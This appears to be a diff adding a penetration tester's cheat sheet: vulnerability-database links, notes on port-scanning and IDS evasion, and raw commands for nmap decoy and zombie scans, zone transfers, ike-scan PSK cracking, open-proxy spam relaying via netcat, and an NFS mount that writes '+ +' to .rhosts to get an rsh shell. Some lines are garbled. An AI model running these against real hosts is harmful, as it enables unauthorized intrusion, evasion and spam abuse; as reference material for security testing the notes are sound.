@@ -1,0 +1,300 @@
+## Vulnerability Databases
+##
+SecurityFocus (http://www.securityfocus.com)
+milw0rm (http://www.milw0rm.com)
+Packet Storm (http://www.packetstormsecurity.org)
+FrSIRT (http://www.frsirt.com)
+MITRE Corporation CVE (http://cve.mitre.org)
+NIST National Vulnerability Database (http://nvd.nist.gov)
+ISS X-Force (http://xforce.iss.net)
+CERT vulnerability notes (http://www.kb.cert.org/vuls)
+
+## Vulnerability Feeds
+##
+eEye Preview (http://research.eeye.com/html/services/)
+3Com TippingPoint DVLabs (http://dvlabs.tippingpoint.com)
+VeriSign iDefense Security Intelligence Services (http://labs.idefense.com/services/)
+
+###|
+###| pilfering techniques (deleting logs and installing backdoors, sniffers, and other
+tools)
+###|
+
+
+======================================================================================
+======================================================================================
+======================================================================================
+
+ICMP scanning and probing
+By launching an ICMP ping sweep, you can effectively identify poorly protected
+hosts (as security-conscious administrators filter inbound ICMP messages) and
+perform a degree of operating system fingerprinting and reconnaissance by
+analyzing responses to the ICMP probes.
+
+Half-open SYN flag TCP port scanning
+A SYN port scan is often the most effective type of port scan to launch directly
+against a target IP network space. SYN scanning is extremely fast, allowing you
+to scan large networks quickly.
+
+Inverse TCP port scanning
+Inverse scanning types (particularly FIN, XMAS, and NULL) take advantage of
+idiosyncrasies in certain TCP/IP stack implementations. This scanning type isn’t
+effective when scanning large network spaces, although it is useful when testing
+and investigating the security of specific hosts and small network segments.
+
+Third-party TCP port scanning
+Using a combination of vulnerable network components and TCP spoofing,
+third-party TCP port scans can be effectively launched. Scanning in this fashion
+has two benefits: hiding the true source of a TCP scan and assessing the filters
+and levels of trust between hosts. Although time-consuming to undertake, third-
+party scanning is extremely useful when applied correctly.
+
+UDP port scanning
+Identifying accessible UDP services can be undertaken easily only if ICMP type 3
+code 3 (“Destination port unreachable”) messages are allowed back through fil-
+tering mechanisms that protect target systems. UDP services can sometimes be
+used to gather useful data or directly compromise hosts (the DNS, SNMP, TFTP,
+and BOOTP services in particular).
+
+IDS evasion and filter circumvention
+Intrusion detection systems and other security mechanisms can be rendered inef-
+fective by using multiple spoofed decoy hosts when scanning or by fragmenting
+probe packets using Nmap or fragroute. Filters such as firewalls, routers, and
+even software (including the Microsoft IPsec filter) can sometimes be bypassed
+using specific source TCP or UDP ports, source routing, or stateful attacks.
+
+
+======================================================================================
+======================================================================================
+======================================================================================
+
+
+
+## Recon Tools
+##
+whois
+dig
+traceroute
+nslookup
+
+## Network Scanning Tools 
+##
+nmap 
+nessus
+
+##
+##Enumerate Ogjects with whois
+whois nintendo -h whois.apnic.net
+
+##
+##Enumerate MITRE corporation staff through ARIN
+whois "@mitre.org" -h whois.arin.net
+
+##
+##Host zone transfer 
+host -l hostname
+
+##
+##Dig zone transfer 
+dig @mail.server domain axfr
+
+##
+##Dig PTR record 
+dig @mail.server dnserver.in-addr.arpa axfr
+
+##
+##Forward DNS grinding to identify mail servers
+C:\tools> txdns -f mail-dict.txt bankofengland.co.uk
+
+##
+##Figer aneuresei internal user names me redirection
+finger @192.168.0.10@217.34.17.200
+
+##
+##Searching the LDAP directory with ldapsearch
+ldapsearch -h 192.168.1.202
+
+##
+##Nmap ping sweep 
+nmap -sP -PI 127.0.0.1
+
+##
+##Enumerating subnet network and broadcast addresses with Nmap
+nmap -sP 127.0.0.1
+
+##
+##Operating system fingerprinting using Xprobe 2
+xprobe2 -v 192.168.1.1 or /24
+
+##
+##Nmap ftp bounce port scanning
+nmap –P0 –b username:password@ftp-server:port <target host>
+
+##
+##Nmap to perform IP ID header scanning (zombie)
+nmap -P0 -sI 192.168.0.155 192.168.0.50
+
+##
+##IDS/IPS Evasion (Fragmentation)
+fragtest frag frag-new frag-old www.bbc.co.uk 
+fragroute 192.168.1.1
+nmap -sS -f 192.168.102.251
+
+##
+##Using Nmap to specify decoy addresses
+nmap -sS -P0 -D 62.232.12.8,ME,65.213.217.241 192.168.102.251
+
+##
+##Using hping 
+hping3 -c 3 -s 53 -p 139 -S 192.168.0.1 ( -c = paketa, -s = source port, -p = port, -S = syn)
+
+##
+##Using Firewalk to assess network filtering
+firewalk -n -S21,22,23,25,53,80 -pTCP gw.test.org www.test.org
+
+##
+##Nmap to test TCP and IP ID sequences
+nmap -v -sS -O 192.168.102.251
+
+##
+##Using DiG and NSlookup to glean BIND version information
+dig @nserver.apple.com version.bind chaos txt
+
+nslookup
+> server nserver.apple.com
+Default server: nserver.apple.com
+Address: 17.254.0.50#53
+> set class=chaos
+> set type=txt
+> version.bind
+
+##
+##A successful HTTP CONNECT bounce
+nc www.example.org 80
+Trying 192.168.0.14...
+Connected to 192.168.0.14.
+Escape character is '^]'.
+CONNECT maila.microsoft.com:25 HTTP/1.0
+
+##
+##A successful HTTP POST bounce
+nc www.example.org 80
+Trying 192.168.0.14...
+Connected to 192.168.0.14.
+Escape character is '^]'.
+POST http://maila.microsoft.com:25/ HTTP/1.0
+Content-Type: text/plain
+Content-Length: 0
+
+##
+##A successful HTTP GET bounce
+nc cacheflow.example.org 80
+Trying 192.168.0.7...
+Connected to 192.168.0.7.
+Escape character is '^]'.
+GET / HTTP/1.1
+HOST: mx4.sun.com:25
+HELO .
+MAIL FROM: spammer@alter.net
+RCPT TO: target@unsuspecting.com
+DATA
+Subject: Look Ma! I'm an open relay
+Hi, you've been spammed through an open proxy, because of a bug in The CacheOS 4 platform
+code. Have a great day!
+-Spammer
+
+##
+##
+##Basic WebDAV support from an Apache 2.0.54 server
+nc test.webdav.org 80
+Trying 140.211.166.111...
+Connected to www.webdav.org.
+Escape character is '^]'.
+OPTIONS / HTTP/1.0
+
+##
+##Mirroring a web site using GNU Wget
+wget -r -m -nv http://www.example.org/
+
+##
+##FTP bounce scanning with Nmap
+nmap -P0 -b 142.51.17.230 192.168.0.5 -p21,22,23,25,80
+
+##
+##SMTP subsystem 
+nc 192.168.1.202 25
+EHLO 
+MAIL FROM: spammer@mail.com
+RCPT TO: spam_me@mail.com
+DATA
+This is test
+QUIT
+
+##
+##Identifying IPsec VPN endpoints with ike-scan
+ike-scan --quiet 10.0.0.0/24
+
+##
+##ike-scan fingerprinting the VPN servers
+ike-scan --showbackoff --multiline 10.0.0.4 10.0.0.11 10.0.0.47 10.0.0.50 10.0.0.254
+
+##
+##ike-scan with custom transform attributes
+ike-scan --auth=3 --showbackoff --multiline 10.0.0.1
+ike-scan --multiline --trans=5,1,1,5 --showbackoff 10.0.0.20
+
+##
+##Enumerating supported transforms using ike-scan
+ike-scan -M --trans=5,2,1,2 10.0.0.254
+ike-scan -M --trans=1,1,1,2 10.0.0.254
+
+##
+##Aggressive mode username enumeration with ike-scan
+ike-scan --aggressive --multiline --id=royhills@hotmail.com 10.0.0.254
+ike-scan --aggressive --multiline --id=johndoe@hotmail.com 192.168.124.155
+
+##
+##Sniffing an aggressive mode packet to discover the username
+tcpdump -n -i eth0 -s 0 -X udp port 500
+
+##
+##Obtaining and cracking an aggressive mode pre-shared key
+ike-scan --aggressive --multiline --id=royhills@hotmail.com -pskcrack=netscreen.psk 10.
+0.0.254
+psk-crack netscreen.psk
+
+##
+##Using openssl ciphers to list all the possible ciphers
+openssl ciphers ALL:eNULL
+
+##
+##Attempting to connect using RC4-MD5
+openssl s_client -cipher RC4-MD5 -connect 172.16.3.18:443
+openssl s_client -cipher EXP-RC4-MD5 -connect 172.16.3.18:443
+openssl s_client -cipher NULL-MD5 -connect 172.16.3.18:443
+
+##
+##Using Nmap to find RPC services running on high ports
+nmap -sR 10.0.0.9
+
+##
+##Connect to RPC without portmapper access
+showmount -e 10.0.0.9
+mount 10.0.0.6:/home /mnt
+cd jarvis
+$ echo + + > .rhosts
+$ cd /
+$ umount /mnt
+$ rsh -l jarvis 10.0.0.6 csh -i
+
+
+
+
+MODBUSPAL
+MBTGET
+PLCSCAN
+SNAMP7
+
+
+
+
